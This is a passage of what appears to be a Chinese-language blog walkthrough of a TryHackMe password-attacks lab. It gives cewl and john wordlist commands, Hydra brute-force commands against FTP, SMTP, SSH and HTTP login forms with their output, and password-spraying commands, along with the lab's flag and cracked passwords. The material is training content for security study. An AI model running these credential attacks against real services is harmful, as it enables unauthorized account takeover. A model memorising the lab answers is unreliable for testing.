+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217818.png" alt="image-20240715181103328"></p>
+<h1 id="0x07-部署虚拟机">0x07 部署虚拟机</h1>
+<p>部署附加的虚拟机以应用我们在本会议室讨论的知识。连接的虚拟机有各种在线服务可以执行密码攻击。需要自定义单词列表来查找有效的凭据。</p>
+<p>我们建议使用 <a target="_blank" rel="noopener" href="https://clinic.thmredteam.com/">https://clinic.thmredteam.com/</a> 创建您的自定义单词列表。</p>
+<p>要使用 cewl 针对网站生成单词列表：</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ cewl -m <span class="hljs-number">8</span> -w clinic.lst <span class="hljs-attribute">https</span>://clinic.thmredteam.com/</code></pre>
+<p>请注意，您还需要生成一个用户名单词列表，如在线攻击问题的任务 3：密码分析 #1 中所示。</p>
+<h2 id="在线密码攻击">在线密码攻击</h2>
+<p>在线密码攻击涉及猜测使用用户名和密码身份验证方案的网络服务的密码，包括 HTTP、SSH、VNC、FTP、SNMP、POP3 等服务。本节展示使用 Hydra，这是攻击登录时使用的常用工具用于各种网络服务。</p>
+<h3 id="hydra">Hydra</h3>
+<p>Hydra 支持广泛的网络服务攻击。在本节中，我们将使用 Hydra 暴力破解网络服务，例如 Web 登录页面、FTP、SMTP 和 SSH。 通常，在 Hydra 中，每个服务都有自己的选项，并且 Hydra 期望的语法需要习惯。检查帮助选项以获取更多信息和功能非常重要。</p>
+<h3 id="ftp">FTP</h3>
+<p>在下面的场景中，我们将对 FTP 服务器执行暴力攻击。通过查看Hydra帮助选项，我们知道攻击FTP服务器的语法如下：</p>
+<pre><code class="hljs scss">hydra -l ftp -<span class="hljs-selector-tag">P</span> passlist<span class="hljs-selector-class">.txt</span> ftp://<span class="hljs-number">10.10</span>.x.x</code></pre>
+<blockquote>
+<p>-l ftp 我们指定单个用户名，使用-L 作为用户名单词列表</p>
+<p>-P Path 指定wordlist的完整路径，可以使用-p指定单个密码.</p>
+<p><a href="ftp://10.10.x.x">ftp://10.10.x.x</a> 目标的协议和 IP 地址或完全限定域名 (FDQN)。</p>
+</blockquote>
+<p>请记住，有时您不需要暴力破解，可以先尝试默认凭据。尝试攻击连接的虚拟机上的 FTP 服务器并回答以下问题。</p>
+<h3 id="smtp">SMTP</h3>
+<p>与 FTP 服务器类似，我们也可以使用 Hydra 暴力破解 SMTP 服务器。语法与前面的示例类似。唯一的区别是目标协议。请记住，如果您想尝试其他在线密码攻击工具，您可能需要指定端口号，即 25。请务必阅读该工具的帮助选项。</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ hydra -l email<span class="hljs-keyword">@company</span>.xyz -P /path/to/wordlist.txt <span class="hljs-attribute">smtp</span>://<span class="hljs-number">10.10</span>.x.x -v 
+Hydra (<span class="hljs-attribute">https</span>://github.com/vanhauser-thc/thc-hydra) starting at <span class="hljs-number">2021</span>-<span class="hljs-number">10</span>-<span class="hljs-number">13</span> <span class="hljs-number">03</span>:<span class="hljs-number">41</span>:<span class="hljs-number">08</span>
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - <span class="hljs-keyword">and</span> stay legal!
+[DATA] max <span class="hljs-number">7</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">7</span> tasks, <span class="hljs-number">7</span> login tries (<span class="hljs-attribute">l</span>:<span class="hljs-number">1</span>/<span class="hljs-attribute">p</span>:<span class="hljs-number">7</span>), ~<span class="hljs-number">1</span> try per task
+[DATA] attacking <span class="hljs-attribute">smtp</span>://<span class="hljs-number">10.10</span>.x.<span class="hljs-attribute">x</span>:<span class="hljs-number">25</span>/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[<span class="hljs-number">25</span>][smtp] <span class="hljs-attribute">host</span>: <span class="hljs-number">10.10</span>.x.x   <span class="hljs-attribute">login</span>: email<span class="hljs-keyword">@company</span>.xyz <span class="hljs-attribute">password</span>: xxxxxxxx
+[STATUS] attack finished for <span class="hljs-number">10.10</span>.x.x (waiting for children to complete tests)
+<span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid password found</code></pre>
+<h3 id="ssh">SSH</h3>
+<p>如果您的服务器可以访问 Internet，则 SSH 暴力破解可能很常见。 Hydra 支持许多协议，包括 SSH。我们可以使用前面的语法来执行我们的攻击！值得注意的是，密码攻击依赖于拥有出色的单词列表来增加找到有效用户名和密码的机会。</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ hydra -L users.lst -P /path/to/wordlist.txt <span class="hljs-attribute">ssh</span>://<span class="hljs-number">10.10</span>.x.x -v
+ 
+Hydra v8.<span class="hljs-number">6</span> (c) <span class="hljs-number">2017</span> by van Hauser/THC - Please do <span class="hljs-keyword">not</span> use in military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> for illegal purposes. 
+
+Hydra (<span class="hljs-attribute">https</span>://github.com/vanhauser-thc/thc-hydra) starting at <span class="hljs-number">2021</span>-<span class="hljs-number">10</span>-<span class="hljs-number">13</span> <span class="hljs-number">03</span>:<span class="hljs-number">48</span>:<span class="hljs-number">00</span>
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the <span class="hljs-attribute">tasks</span>: use -t <span class="hljs-number">4</span>
+[DATA] max <span class="hljs-number">8</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">8</span> tasks, <span class="hljs-number">8</span> login tries (<span class="hljs-attribute">l</span>:<span class="hljs-number">1</span>/<span class="hljs-attribute">p</span>:<span class="hljs-number">8</span>), ~<span class="hljs-number">1</span> try per task
+[DATA] attacking <span class="hljs-attribute">ssh</span>://<span class="hljs-number">10.10</span>.x.<span class="hljs-attribute">x</span>:<span class="hljs-number">22</span>/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by <span class="hljs-attribute">ssh</span>://user@<span class="hljs-number">10.10</span>.x.<span class="hljs-attribute">x</span>:<span class="hljs-number">22</span>
+[INFO] Successful, password authentication is supported by <span class="hljs-attribute">ssh</span>://<span class="hljs-number">10.10</span>.x.<span class="hljs-attribute">x</span>:<span class="hljs-number">22</span>
+[<span class="hljs-number">22</span>][ssh] <span class="hljs-attribute">host</span>: <span class="hljs-number">10.10</span>.x.x   <span class="hljs-attribute">login</span>: victim   <span class="hljs-attribute">password</span>: xxxxxxxx
+[STATUS] attack finished for <span class="hljs-number">10.10</span>.x.x (waiting for children to complete tests)
+<span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid password found</code></pre>
+<h3 id="http-登录页面">HTTP 登录页面</h3>
+<p>在这种情况下，我们将暴力破解 HTTP 登录页面。为此，首先，您需要了解您正在暴力破解什么。使用 Hydra，指定 HTTP 请求的类型非常重要，无论是 GET 还是 POST。检查 Hydra 选项： Hydra http-get-form -U，我们可以看到 Hydra 的 http-get-form 选项语法如下：</p>
+<pre><code class="hljs scss">&lt;url&gt;:&lt;form parameters&gt;:&lt;condition string&gt;[:&lt;optional&gt;[:&lt;optional&gt;]
+//&lt;url&gt;:&lt;表单参数&gt;:&lt;条件字符串&gt;[:&lt;可选&gt;[:&lt;可选&gt;]</code></pre>
+<p>正如我们之前提到的，我们需要分析需要发送的 HTTP 请求，这可以通过使用浏览器开发工具或使用 Web 代理（例如 Burp Suite）来完成。</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@machine</span>$ hydra -l admin -P <span class="hljs-number">500</span>-worst-passwords.txt <span class="hljs-number">10.10</span>.x.x http-get-form <span class="hljs-string">"/login-get/index.php:username=^USER^&amp;password=^PASS^:S=logout.php"</span> -f 
+Hydra v8.<span class="hljs-number">6</span> (c) <span class="hljs-number">2017</span> by van Hauser/THC - Please do <span class="hljs-keyword">not</span> use in military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> for illegal purposes. 
+
+Hydra (<span class="hljs-attribute">http</span>://www.thc.org/thc-hydra) starting at <span class="hljs-number">2021</span>-<span class="hljs-number">10</span>-<span class="hljs-number">13</span> <span class="hljs-number">08</span>:<span class="hljs-number">06</span>:<span class="hljs-number">22</span> 
+[DATA] max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">500</span> login tries (<span class="hljs-attribute">l</span>:<span class="hljs-number">1</span>/<span class="hljs-attribute">p</span>:<span class="hljs-number">500</span>), ~<span class="hljs-number">32</span> tries per task 
+[DATA] attacking <span class="hljs-attribute">http-get-form</span>://<span class="hljs-number">10.10</span>.x.<span class="hljs-attribute">x</span>:<span class="hljs-number">80</span>//login-get/index.<span class="hljs-attribute">php</span>:username=^USER^&amp;password=^PASS^:S=logout.php 
+[<span class="hljs-number">80</span>][http-get-form] <span class="hljs-attribute">host</span>: <span class="hljs-number">10.10</span>.x.x   <span class="hljs-attribute">login</span>: admin <span class="hljs-attribute">password</span>: xxxxxx 
+<span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid password found 
+Hydra (<span class="hljs-attribute">http</span>://www.thc.org/thc-hydra) 
+finished at <span class="hljs-number">2021</span>-<span class="hljs-number">10</span>-<span class="hljs-number">13</span> <span class="hljs-number">08</span>:<span class="hljs-number">06</span>:<span class="hljs-number">45</span></code></pre>
+<blockquote>
+<p>-l admin 我们指定单个用户名，使用-L 作为用户名单词列表</p>
+<p>-P Path 指定wordlist的完整路径，可以使用-p指定单个密码.</p>
+<p>10.10.x.x 目标的 IP 地址或完全限定域名 (FQDN)。</p>
+<p>http-get-form HTTP 请求的类型，可以是 http-get-form 或 http-post-form.</p>
+</blockquote>
+<p>接下来，我们使用以下命令指定分割的 URL、路径和条件：</p>
+<blockquote>
+<p>/login-get/index.php 目标网络服务器上登录页面的路径。</p>
+<p>username=^USER^&amp;password=^PASS^ 暴力破解的参数，我们注入 ^USER^ 来暴力破解用户名，注入 ^PASS^ 来破解指定字典中的密码。</p>
+</blockquote>
+<p>以下部分对于通过使用<code>F=Invalid Password</code>条件来消除误报非常重要.</p>
+<p>同时还有成功条件，S=。通过分析网页或在枚举阶段您将获得有关这些情况的更多信息！您为这些值设置的内容取决于您从服务器收到的针对失败登录尝试和成功登录尝试的响应。例如，如果您登录失败后在网页上收到“密码无效”的消息，请设置 F=无效密码.</p>
+<p>或者例如，在枚举过程中，我们发现Web服务器提供logout.php。使用有效凭据登录登录页面后，我们可以猜测页面上的某处将有 logout.php。因此，我们可以告诉 Hydra 在每个请求的 HTML 中查找文本 logout.php。</p>
+<blockquote>
+<p>S=logout.php 识别有效凭证的成功条件</p>
+<p>-f 在找到有效的用户名和密码后停止暴力攻击</p>
+</blockquote>
+<p>您可以通过访问 <a target="_blank" rel="noopener" href="http://10.10.183.122/login-get/index.php">http://10.10.183.122/login-get/index.php</a> 在连接的虚拟机上进行尝试。如果您尚未回答以下问题，请务必部署附加的虚拟机。</p>
+<p>最后，值得检查其他在线密码攻击工具来扩展您的知识，例如：</p>
+<ul>
+<li>Medusa</li>
+<li>Ncrack</li>
+<li>others!</li>
+</ul>
+<h3 id="实践练习">实践练习</h3>
+<p>您能在不进行暴力破解的情况下猜出 FTP 凭据吗？旗帜是什么？</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217819.png" alt="image-20240715193500648"></p>
+<p>ftp匿名登录即可</p>
+<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~]</span>
+└─$ ls                                                                                                 
+armitage-tmp  Desktop    Downloads  Music         Pictures  Public     Tools
+C2            Documents  flag<span class="hljs-selector-class">.txt</span>   nacos-docker  Proxy     Templates  Videos
+
+┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~]</span>
+└─$ cat flag<span class="hljs-selector-class">.txt</span> 
+THM{d0abe799f25738ad739c20301aed357b}</code></pre>
+<p>在本题中，您需要从上一个任务中的单词列表 Clinic.lst 生成基于规则的字典。电子邮件：</p>
+<pre><code class="hljs scss">pittman<span class="hljs-keyword">@clinic</span>.thmredteam.com <span class="hljs-number">10.10</span>.<span class="hljs-number">183.122</span>:<span class="hljs-number">465</span> (SMTPS)</code></pre>
+<p>密码是什么？注意密码格式如下：<code>[symbol][dictionary word][0-9][0-9]</code></p>
+<p>首先利用cewl深度爬取目标网站泄露的信息（用于构建密码字典）</p>
+<pre><code class="hljs scss">cewl -m <span class="hljs-number">8</span> -w clinic<span class="hljs-selector-class">.lst</span> https://clinic.thmredteam.com/</code></pre>
+<p>得到初步单词列表，随后根据提示，构建自己的john规则，生成对用的密码单词列表</p>
+<pre><code class="hljs scss">john <span class="hljs-attr">--wordlist</span>=clinic<span class="hljs-selector-class">.lst</span> <span class="hljs-attr">--rules</span>=THM-Password-Attacks <span class="hljs-attr">--stdout</span> &gt; passwds<span class="hljs-selector-class">.txt</span></code></pre>
+<p>之后根据这个字典，用hydra枚举smtps邮件网站的登陆凭据</p>
+<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~]</span>
+└─$ hydra -l pittman<span class="hljs-keyword">@clinic</span>.thmredteam.com -P passwds.txt <span class="hljs-attribute">smtps</span>://<span class="hljs-number">10.10</span>.<span class="hljs-number">183.122</span> -v
+Hydra v9.<span class="hljs-number">5</span> (c) <span class="hljs-number">2023</span> by van Hauser/THC &amp; David Maciejak - Please do <span class="hljs-keyword">not</span> use in military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> for illegal purposes (this is non-binding, these *** ignore laws <span class="hljs-keyword">and</span> ethics anyway).
+
+Hydra (<span class="hljs-attribute">https</span>://github.com/vanhauser-thc/thc-hydra) starting at <span class="hljs-number">2024</span>-<span class="hljs-number">07</span>-<span class="hljs-number">15</span> <span class="hljs-number">20</span>:<span class="hljs-number">01</span>:<span class="hljs-number">27</span>
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - <span class="hljs-keyword">and</span> stay legal!
+[DATA] max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">42000</span> login tries (<span class="hljs-attribute">l</span>:<span class="hljs-number">1</span>/<span class="hljs-attribute">p</span>:<span class="hljs-number">42000</span>), ~<span class="hljs-number">2625</span> tries per task
+[DATA] attacking <span class="hljs-attribute">smtps</span>://<span class="hljs-number">10.10</span>.<span class="hljs-number">183.122</span>:<span class="hljs-number">465</span>/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[VERBOSE] using SMTP LOGIN AUTH mechanism
+[<span class="hljs-number">465</span>][smtp] <span class="hljs-attribute">host</span>: <span class="hljs-number">10.10</span>.<span class="hljs-number">183.122</span>   <span class="hljs-attribute">login</span>: pittman<span class="hljs-keyword">@clinic</span>.thmredteam.com   <span class="hljs-attribute">password</span>: !multidisciplinary00
+[STATUS] attack finished for <span class="hljs-number">10.10</span>.<span class="hljs-number">183.122</span> (waiting for children to complete tests)
+<span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid password found
+Hydra (<span class="hljs-attribute">https</span>://github.com/vanhauser-thc/thc-hydra) finished at <span class="hljs-number">2024</span>-<span class="hljs-number">07</span>-<span class="hljs-number">15</span> <span class="hljs-number">20</span>:<span class="hljs-number">01</span>:<span class="hljs-number">38</span></code></pre>
+<p>使用 Hydra 对登录页面 <a target="_blank" rel="noopener" href="http://10.10.183.122/login-get">http://10.10.183.122/login-get</a> 的 phillips 帐户执行暴力攻击？旗帜是什么？</p>
+<pre><code class="hljs scss">hydra -l phillips -<span class="hljs-selector-tag">P</span> passwds<span class="hljs-selector-class">.txt</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.183</span><span class="hljs-selector-class">.122</span> http-get-<span class="hljs-selector-tag">form</span> "/login-get/index<span class="hljs-selector-class">.php</span>:username=^USER^&amp;password=^PASS^:S=logout.php<span class="hljs-string">"</span></code></pre>
+<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~]</span>
+└─$ hydra -l phillips -<span class="hljs-selector-tag">P</span> clinic<span class="hljs-selector-class">.lst</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.183</span><span class="hljs-selector-class">.122</span> http-get-<span class="hljs-selector-tag">form</span> "/login-get/index<span class="hljs-selector-class">.php</span>:username=^USER^&amp;password=^PASS^:S=logout.php<span class="hljs-string">"</span>
+<span class="hljs-string">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-15 20:30:27</span>
+<span class="hljs-string">[DATA] max 16 tasks per 1 server, overall 16 tasks, 105 login tries (l:1/p:105), ~7 tries per task</span>
+<span class="hljs-string">[DATA] attacking http-get-form://10.10.183.122:80/login-get/index.php:username=^USER^&amp;password=^PASS^:S=logout.php</span>
+<span class="hljs-string">[80][http-get-form] host: 10.10.183.122   login: phillips   password: Paracetamol</span>
+<span class="hljs-string">1 of 1 target successfully completed, 1 valid password found</span>
+<span class="hljs-string">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-15 20:30:30</span></code></pre>
+<p>就是不知为何，非要利用S选项才可以，如果时F选项，会展示多个无效密码</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217820.png" alt="image-20240715203151681"></p>
+<p>执行基于规则的密码攻击以获取 burgess 帐户的访问权限。在以下网站找到该标志：<a target="_blank" rel="noopener" href="http://10.10.183.122/login-post/%E3%80%82%E6%97%97%E5%B8%9C%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F">http://10.10.183.122/login-post/。旗帜是什么？</a></p>
+<p>注意：使用 Clinic.lst 字典来生成和扩展单词列表！</p>
+<pre><code class="hljs scss">hydra -l burgess -<span class="hljs-selector-tag">P</span> dict<span class="hljs-selector-class">.txt</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.183</span><span class="hljs-selector-class">.122</span> http-post-<span class="hljs-selector-tag">form</span> "/login-post/index<span class="hljs-selector-class">.php</span>:username=^USER^&amp;password=^PASS^:S=logout.php<span class="hljs-string">"</span></code></pre>
+<pre><code class="hljs scss">┌──(hybcx㉿LAPTOP-<span class="hljs-number">1</span>TO1HS75)-<span class="hljs-selector-attr">[~]</span>
+└─$ hydra -l burgess -<span class="hljs-selector-tag">P</span> dict<span class="hljs-selector-class">.txt</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.183</span><span class="hljs-selector-class">.122</span> http-post-<span class="hljs-selector-tag">form</span> "/login-post/index<span class="hljs-selector-class">.php</span>:username=^USER^&amp;password=^PASS^:S=logout.php<span class="hljs-string">"</span>
+<span class="hljs-string">Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-15 20:34:28</span>
+<span class="hljs-string">[DATA] max 16 tasks per 1 server, overall 16 tasks, 537026 login tries (l:1/p:537026), ~33565 tries per task</span>
+<span class="hljs-string">[DATA] attacking http-post-form://10.10.183.122:80/login-post/index.php:username=^USER^&amp;password=^PASS^:S=logout.php</span>
+<span class="hljs-string">[STATUS] 724.00 tries/min, 724 tries in 00:01h, 536302 to do in 12:21h, 16 active</span>
+<span class="hljs-string">[80][http-post-form] host: 10.10.183.122   login: burgess   password: OxytocinnicotyxO</span>
+<span class="hljs-string">1 of 1 target successfully completed, 1 valid password found</span>
+<span class="hljs-string">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-15 20:37:23</span></code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217821.png" alt="image-20240715203827451"></p>
+<h2 id="密码喷洒攻击">密码喷洒攻击</h2>
+<p>此任务将教授密码喷射攻击的基础知识以及针对常见在线服务执行各种攻击场景所需的工具。</p>
+<p>密码喷射是一种用于识别有效凭据的有效技术。如今，密码喷射被认为是发现弱密码的常见密码攻击之一。该技术可用于攻击各种在线服务和身份验证系统，例如 SSH、SMB、RDP、SMTP、Outlook Web 应用程序等。暴力攻击针对特定用户名来尝试许多弱且可预测的密码。虽然密码喷射攻击使用一个常见的弱密码来针对许多用户名，但这可能有助于避免帐户锁定策略。下图解释了密码喷射攻击的概念，其中攻击者对多个用户使用一个通用密码。</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202407152217822.png" alt="image-20240715204425518"></p>
+<p>普通密码和弱密码通常遵循一定的模式和格式。下面可以找到一些常用的密码及其总体格式。</p>
+<ul>
+<li>当前季节紧接着当前年份 (SeasonYear)。For example, <strong>Fall2020</strong>, <strong>Spring2021</strong>, etc.</li>
+<li>当前月份后跟当前年份 (MonthYear)。For example, <strong>November2020</strong>, <strong>March2021</strong>, etc.</li>
+<li>使用公司名称和随机数字 (CompanyNameNumbers)。For example, TryHackMe01, TryHackMe02.</li>
+</ul>
+<p>如果组织内部强制执行密码复杂性策略，我们可能需要创建一个包含满足要求的符号的密码，例如 October2021!、Spring2021!、October2021@ 等。要成功进行密码喷射攻击，我们需要枚举目标并创建有效用户名列表（或电子邮件地址列表）.</p>
+<p>接下来，我们将针对不同的服务应用不同场景的密码喷射技术，包括：</p>
+<ul>
+<li>SSH</li>
+<li>RDP</li>
+<li>Outlook web access (OWA) portal</li>
+<li>SMB</li>
+</ul>
+<h3 id="ssh">SSH</h3>
+<p>假设我们已经枚举了系统并创建了有效的用户名列表。</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@THM</span>:~# cat usernames-list.txt
+admin
+victim
+dummy
+adm
+sammy</code></pre>
+<p>这里我们可以使用 Hydra 用 Spring2021 密码对 SSH 服务进行密码喷射攻击。</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@THM</span>:~$ hydra -L usernames-list.txt -p Spring2021 <span class="hljs-attribute">ssh</span>://<span class="hljs-number">10.1</span>.<span class="hljs-number">1.10</span>
+[INFO] Successful, password authentication is supported by <span class="hljs-attribute">ssh</span>://<span class="hljs-number">10.1</span>.<span class="hljs-number">1.10</span>:<span class="hljs-number">22</span>
+[<span class="hljs-number">22</span>][ssh] <span class="hljs-attribute">host</span>: <span class="hljs-number">10.1</span>.<span class="hljs-number">1.10</span> <span class="hljs-attribute">login</span>: victim <span class="hljs-attribute">password</span>: Spring2021
+[STATUS] attack finished for <span class="hljs-number">10.1</span>.<span class="hljs-number">1.10</span> (waiting for children to complete tests)
+<span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid password found</code></pre>
+<p>请注意，L 是加载有效用户名列表，-p 对 10.1.1.10 的 SSH 服务使用 Spring2021 密码。上面的输出表明我们已成功找到凭据。</p>
+<h3 id="rdp">RDP</h3>
+<p>假设我们在端口 3026 上发现了暴露的 RDP 服务。我们可以使用 <a target="_blank" rel="noopener" href="https://github.com/xFreed0m/RDPassSpray">RDPassSpray</a> 等工具对 RDP 进行密码喷射。首先，按照该工具的 GitHub 存储库中的安装说明在攻击计算机上安装该工具。作为该工具的新用户，我们将首先执行 python3 <a target="_blank" rel="noopener" href="http://RDPassSpray.py">RDPassSpray.py</a> -h 命令来查看如何使用该工具</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@THM</span>:~# python3 RDPassSpray.py -h
+<span class="hljs-attribute">usage</span>: RDPassSpray.py [-h] (-U USERLIST | -u USER  -p PASSWORD | -P PASSWORDLIST) (-T TARGETLIST | -t TARGET) [-s SLEEP | -r minimum_sleep maximum_sleep] [-d DOMAIN] [-n NAMES] [-o OUTPUT] [-V]
+
+optional <span class="hljs-attribute">arguments</span>:
+  -h, --help            show this help message <span class="hljs-keyword">and</span> exit
+  -U USERLIST, --userlist USERLIST
+                        Users list to use, one user per line
+  -u USER, --user USER  Single user to use
+  -p PASSWORD, --password PASSWORD
+                        Single password to use
+  -P PASSWORDLIST, --passwordlist PASSWORDLIST
+                        Password list to use, one password per line
+  -T TARGETLIST, --targetlist TARGETLIST
+                        Targets list to use, one target per line
+  -t TARGET, --target TARGET
+                        Target machine to authenticate against
+  -s SLEEP, --sleep SLEEP
+                        Throttle the attempts to one attempt every # seconds, can be randomized by passing the value <span class="hljs-string">'random'</span> - default is <span class="hljs-number">0</span>
+  -r minimum_sleep maximum_sleep, --random minimum_sleep maximum_sleep
+                        Randomize the time between each authentication attempt. Please provide minimun <span class="hljs-keyword">and</span> maximum values in seconds
+  -d DOMAIN, --domain DOMAIN
+                        Domain name to use
+  -n NAMES, --names NAMES
+                        Hostnames list to use as the source hostnames, one per line
+  -o OUTPUT, --output OUTPUT
+                        Output each attempt result to a csv file
+  -V, --verbose         Turn on verbosity to show failed attempts</code></pre>
+<p>现在，让我们尝试使用 (-u) 选项将victim指定为用户名，并使用 (-p) 选项设置 Spring2021!。 (-t)选项是选择单个主机进行攻击.</p>
+<p>上面的输出显示我们成功找到了有效的凭据受害者：Spring2021！请注意，如果我们处于 Active Directory 环境中，我们可以使用 -d 选项指定域名.</p>
+<pre><code class="hljs scss">user<span class="hljs-keyword">@THM</span>:~# python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt</code></pre>
+<p>有各种工具可以针对不同的服务执行喷洒密码攻击，例如：</p>
+<h3 id="outlook-web-access-owa-portal">Outlook Web Access (OWA) portal</h3>
+<p>Tools:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/SprayingToolkit">SprayingToolkit</a> (<a target="_blank" rel="noopener" href="http://atomizer.py">atomizer.py</a>)</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/dafthack/MailSniper">MailSniper</a></li>
+</ul>
+<h3 id="smb">SMB</h3>
+<ul>
+<li>Tool: Metasploit (auxiliary/scanner/smb/smb_login)</li>
+</ul>
+<h3 id="实践练习">实践练习</h3>
